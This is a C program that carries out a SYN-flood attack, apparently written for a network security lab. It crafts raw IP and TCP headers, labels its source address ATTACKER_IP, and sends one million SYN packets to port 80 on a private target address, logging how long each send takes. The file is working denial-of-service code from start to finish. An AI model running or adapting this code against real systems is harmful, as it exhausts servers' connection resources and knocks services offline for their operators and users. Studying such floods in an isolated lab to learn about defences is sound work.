#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/time.h>
#include <errno.h>
#include <sys/types.h>

// Constants
#define INNER_LOOPS 10000
#define OUTER_LOOPS 100
#define TARGET_IP "10.9.0.4"
#define TARGET_PORT 80
#define ATTACKER_IP "10.9.0.2"
#define PACKET_LEN 4096

/* 
    96 bit (12 bytes) pseudo header needed for tcp header checksum calculation 
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
}pseudo_header;
 

// Function to calculate checksum
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    unsigned short *w = buf;
    int nleft = len;
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }
    if (nleft == 1) {
        sum += *(unsigned char *)w;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}

void setIPHeader(struct iphdr *iph, struct sockaddr_in *sin) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(ATTACKER_IP); // Attacker's IP
    iph->daddr = sin->sin_addr.s_addr;
    iph->check = 0; // Checksum will be calculated later
}

void setTCPHeader(struct tcphdr *tcph) {
    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(TARGET_PORT);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // TCP header length
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); /* maximum allowed window size */
    tcph->check = 0; // Checksum will be calculated later
    tcph->urg_ptr = 0;
}

// Function to send a single SYN packet and log the time it took
void send_syn_packet(int sockfd, struct sockaddr_in *target_addr, int index, FILE *log_file) {
    char packet[PACKET_LEN];
    memset(packet, 0, PACKET_LEN);

    // IP header
    struct iphdr *iph = (struct iphdr *) packet;

    // TCP header
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));

    // Set IP header
    setIPHeader(iph, target_addr);

    // Set TCP header
    setTCPHeader(tcph);

    // Calculate IP checksum
    iph->check = checksum((unsigned short *) packet, iph->tot_len);

    // Calculate TCP checksum
    struct pseudo_header psh;
    psh.source_address = inet_addr(ATTACKER_IP);
    psh.dest_address = target_addr->sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char pseudogram[psize];
    memset(pseudogram, 0, psize);
    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
    tcph->check = checksum((unsigned short *) pseudogram, psize);

    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }

    // Send the packet and log the time it took
    struct timeval start_time, finish_time;
    gettimeofday(&start_time, NULL);

    if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *) target_addr, sizeof(*target_addr)) < 0) {
        perror("Send failed");
    }

    gettimeofday(&finish_time, NULL);

    // Calculate time difference in milliseconds
    float time_diff = (finish_time.tv_sec - start_time.tv_sec) * 1000.0 + (finish_time.tv_usec - start_time.tv_usec) / 1000.0;

    // Log the time difference
    fprintf(log_file, "%d %lf\n", index, time_diff);
}

int main() {
    int sockfd;
    struct sockaddr_in target_addr;
    FILE *log_file = fopen("syns_result_c.txt", "w");

    if (log_file == NULL) {
        perror("Failed to open log file");
        return 1;
    }

    // Initialize target address
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(TARGET_PORT);
    inet_pton(AF_INET, TARGET_IP, &target_addr.sin_addr);

    // Create raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Send SYN packets
    for (int i = 0; i < OUTER_LOOPS; i++) {
        for (int j = 0; j < INNER_LOOPS; j++) {
            send_syn_packet(sockfd, &target_addr, i * INNER_LOOPS + j, log_file);
            if ((j + 1) % 1000 == 0) {
                printf("Sent %d packets in iteration %d\n", j + 1, i + 1);
            }
        }
    }

    fclose(log_file);
    close(sockfd);
    return 0;
}
